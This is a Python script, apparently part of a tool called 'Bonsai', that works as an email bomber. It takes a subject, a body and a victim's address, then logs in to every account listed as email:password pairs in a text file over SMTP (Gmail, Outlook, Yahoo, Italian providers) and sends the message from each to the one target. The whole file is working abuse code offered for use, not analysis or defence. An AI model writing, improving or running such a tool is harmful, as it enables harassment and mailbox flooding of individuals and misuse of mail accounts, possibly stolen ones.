import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore
import os
import ctypes
from pystyle import Colors, Colorate, Write
def bomber():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW('Bonsai - Email Bomber')
    oggetto_email = input(Colors.green + "Inserisci l'oggetto dell'email: " + Colors.reset)
    contenuto_email = input(Colors.green + "Inserisci il contenuto dell'email: " + Colors.reset)
    email_destinatario = input(Colors.green + "Inserisci l'email del destinatario: " + Colors.reset)

    SMTP_SETTINGS = {
        "gmail.com":   {"host": "smtp.gmail.com", "port": 587},
        "libero.it":   {"host": "smtp.libero.it", "port": 587},
        "virgilio.it": {"host": "smtp.virgilio.it", "port": 587},
        "outlook.com": {"host": "smtp.office365.com", "port": 587},
        "hotmail.com": {"host": "smtp.office365.com", "port": 587},
        "tiscali.it":  {"host": "smtp.tiscali.it", "port": 587},
        "yahoo.com":   {"host": "smtp.mail.yahoo.com", "port": 587},
    }

    def get_smtp_settings(email):
        dominio = email.split("@")[-1].lower()
        return SMTP_SETTINGS.get(dominio)

    def process_emails(filename="email.txt"):
        with open(filename, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]

        num_emails = len(lines)


        for line in lines:
            if ":" in line:
                a, b = line.split(":", 1)
            else:
                a, b = line, ""
            email_mittente = a
            password_mittente = b

            smtp_info = get_smtp_settings(email_mittente)
            if not smtp_info:
                print(f"{Colors.red}Provider non riconosciuto per {email_mittente}{Colors.reset}")
                continue

            messaggio = MIMEMultipart()
            messaggio["From"] = email_mittente
            messaggio["To"] = email_destinatario
            messaggio["Subject"] = oggetto_email
            messaggio.attach(MIMEText(contenuto_email, "plain"))

            try:
                server = smtplib.SMTP(smtp_info["host"], smtp_info["port"])
                server.starttls()
                server.login(email_mittente, password_mittente)

                testo = messaggio.as_string()
                server.sendmail(email_mittente, email_destinatario, testo)
                server.quit()
                print(f"{Colors.green}Email inviata con successo da {email_mittente}!{Colors.reset}")
            except Exception as e:
                print(f"{Colors.red}Errore nell'invio dell'email da {email_mittente}: {e}{Colors.reset}")

        return num_emails

    process_emails("email.txt")
